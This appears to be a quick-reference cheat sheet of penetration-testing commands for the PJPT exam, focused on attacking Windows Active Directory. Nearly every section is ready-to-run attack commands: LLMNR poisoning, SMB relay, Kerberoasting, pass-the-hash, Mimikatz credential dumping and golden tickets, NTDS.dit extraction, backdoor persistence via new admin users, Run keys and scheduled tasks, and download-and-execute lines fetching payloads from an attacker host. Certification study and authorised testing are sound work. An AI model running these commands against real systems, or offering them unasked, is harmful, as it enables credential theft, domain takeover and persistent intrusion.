# 🚀 PJPT Quick Reference Commands

## Initial Recon & Enumeration

```bash
# Network discovery
nmap -sn 10.10.10.0/24
nmap -sC -sV -O -p- --min-rate=1000 10.10.10.10

# DNS enumeration
dnsrecon -d domain.local -r 10.10.10.0/24
dnsenum domain.local

# SMB enumeration
smbclient -L //10.10.10.10
enum4linux -a 10.10.10.10
crackmapexec smb 10.10.10.0/24
```

## LLMNR/NBT-NS Poisoning

```bash
# Start Responder
sudo responder -I eth0 -rdwv

# Crack captured hashes
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## SMB Relay Attack

```bash
# Check for SMB signing
nmap --script=smb2-security-mode -p445 10.10.10.0/24

# Turn off SMB in Responder
nano /etc/responder/Responder.conf  # Set SMB = Off

# Start relay 
# you might need to use impacket-ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Connect to interactive shell
nc 127.0.0.1 11000
```

## Kerberoasting

```bash
# Get SPNs
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Crack tickets
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

## Pass the Hash/Ticket

```bash
# Pass the Hash
crackmapexec smb 10.10.10.10 -u Administrator -H <NTLM_HASH>
psexec.py domain.local/Administrator@10.10.10.10 -hashes :<NTLM_HASH>

# Pass the Ticket
getTGT.py domain.local/user:password
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain.local/user@target.domain.local
```

## Token Impersonation

```powershell
# In Meterpreter
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
```

## Mimikatz Quick Commands

```powershell
# Dump credentials
privilege::debug
sekurlsa::logonpasswords

# Dump tickets
sekurlsa::tickets

# Export tickets
kerberos::list /export

# Golden ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<HASH> /id:500
```

## NTDS.dit Extraction

```bash
# Remote with secretsdump
secretsdump.py domain.local/Administrator:password@10.10.10.10

# Local extraction
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## Persistence

```powershell
# Add user
net user hacker Password123! /add
net localgroup administrators hacker /add

# Registry persistence
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\backdoor.exe"

# Scheduled task
schtasks /create /tn "Updater" /tr "C:\Windows\backdoor.exe" /sc onlogon
```

## IPv6 Attacks

```bash
# mitm6 attack
mitm6 -d domain.local

# In another terminal
ntlmrelayx.py -6 -wh attacker-wpad -t smb://10.10.10.10 -l loot
```

## Quick Win Commands

```bash
# Check for null sessions
rpcclient -U "" -N 10.10.10.10

# LDAP anonymous bind
ldapsearch -x -h 10.10.10.10 -s base

# Check for MS17-010
nmap -p445 --script smb-vuln-ms17-010 10.10.10.10

# Quick domain user enum
crackmapexec smb 10.10.10.10 -u guest -p '' --users
```

## File Transfer

```powershell
# PowerShell download
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/script.ps1')

# Certutil
certutil -urlcache -split -f http://10.10.10.10/file.exe file.exe

# SMB server
# Attacker: python3 -m impacket.smbserver share . -smb2support
# Target: copy \\10.10.10.10\share\file.exe .
```

## Remember!
- Always check SMB signing before relay attacks
- Try password = username for service accounts
- Check for PrintNightmare, ZeroLogon if newer systems
- Document everything - screenshots are your friend! 